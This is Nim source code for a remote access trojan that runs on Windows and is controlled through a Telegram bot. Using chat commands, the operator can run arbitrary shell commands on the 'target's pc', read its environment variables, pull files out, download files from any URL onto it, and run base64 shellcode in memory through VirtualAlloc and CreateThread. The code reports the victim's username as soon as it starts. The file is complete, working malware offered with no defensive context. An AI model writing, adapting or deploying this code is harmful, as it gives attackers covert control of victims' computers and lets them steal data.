import telebot, asyncdispatch, logging, options, os , osproc, strutils, httpclient, json, winim/lean, base64
from strformat import fmt


const API_KEY = "YOUR_API_KEY"
const chat_id = 0000 #YOUR_CHAT_ID_WITH_THE_BOT

let help_message = """
/help shows this help message
/env <var> get enviroment variables
/exec <command> execute command line arguments
/download <filename> downloads file from target's pc
/downloadUrl <url> downloads a file from url to target's pc
/shellcode <base64 shellcode> executes shellcode in memeory
"""


proc execShellCode(shellcode: string) =
    var buf = shellcode
    var lpBufSize: DWORD = (DWORD)len(buf)
    var lpBuf = VirtualAlloc(NULL, lpBufSize, 0x3000, 0x00000040)
    RtlMoveMemory(lpBuf, &buf, len(buf))
    var lpStart: LPTHREADSTARTROUTINE = cast[proc(lpThreadParameter: LPVOID): DWORD{.stdcall.}](lpBuf)
    var hThread = CreateThread(NULL, 0, lpStart, lpBuf, 0, NULL)
    WaitForSingleObject(hThread, -1)

proc shellCode(b: Telebot, e: Command) {.async.} =
    let shellcode = decode(e.message.text.get.split(" ", 1)[1])
    execShellCode(shellcode)
    discard await b.send(newMessage(e.message.chat.id, "[*] Shellcode (" & $shellcode.len() & " bytes) executed in memory."))

proc downloadUrl(b:TeleBot, e: Command) {.async.} =
    let url = e.message.text.get.split(" ", 1)[1]
    let output = "log.txt"
    downloadFile(url, output)

proc download(b: Telebot, e: Command) {.async.} =
    let file_name = e.message.text.get.split(" ", 1)[1]
    let f = "file://" & file_name
    var document = newDocument(e.message.chat.id, f)
    document.caption = file_name
    discard await b.send(document)



proc uploadHandler(b: TeleBot, e: Update) {.async.} =
  let
    url_getfile = fmt"https://api.telegram.org/bot{API_KEY}/getFile?file_id="
    api_file = fmt"https://api.telegram.org/file/bot{API_KEY}/"

  var response = e.message.get
  if response.document.isSome:
    let
      document = response.document.get
      file_name = document.file_name.get
      responz = await newAsyncHttpClient().get(url_getfile) # file_id > file_path
      responz_body = await responz.body
      file_path = parseJson(responz_body)["result"]["file_path"].getStr()
      responx = await newAsyncHttpClient().get(api_file & file_path)  # file_path > file
      file_content = await responx.body
    writeFile(file_name, file_content)
    discard await b.send(newMessage(response.chat.id, "file uploaded successfully"))





proc help(b: Telebot, e: Command) {.async.} =
    let message = newMessage(e.message.chat.id, help_message)
    discard await b.send(message)



proc execCmd(b: Telebot, e: Command) {.async.} =
    try:
        let com = e.message.text.get.split(" ", 1)[1]
        let (res, errC) = execCmdEx("cmd /c " & com, options = {poDemon, poEvalCommand})
    
        if len(res) != 0:
            let message = newMessage(e.message.chat.id, res)
            discard await b.send(message)
    except:
        let
          er = getCurrentException()
          msg = getCurrentExceptionMsg()
          mes = "Got exception " & repr(er) & " with message " & msg
        discard await b.send(newMessage(e.message.chat.id, mes))


proc get_env(b: Telebot, e: Command) {.async.} =
    if e.message.text.isSome:
        let res = getEnv(e.message.text.get.split()[1])
        let message = newMessage(e.message.chat.id, res)
        discard await b.send(message)

# proc updateHandler(b: Telebot, u: Update) {.async.} =
#     var response = u.message.get
#     if response.text.isSome:
#       echo response.text.get
#       var text = readLine(stdin)
#       var message = newMessage(response.chat.id, text)
#       message.disableNotification = true
#       discard await b.send(message)
try: 
    let bot = newTeleBot(API_KEY)
    bot.send(newMessage(chat_id, getEnv("username") & " is on"))
    bot.onCommand("env", get_env)
    bot.onCommand("exec", execCmd)
    bot.onCommand("download", download)
    bot.onCommand("help", help)
    bot.onCommand("downloadUrl", downloadUrl)
    bot.onCommand("shellcode", shellCode)
    bot.onUpdate(uploadHandler)
    bot.poll(timeout=300)
except:
    discard
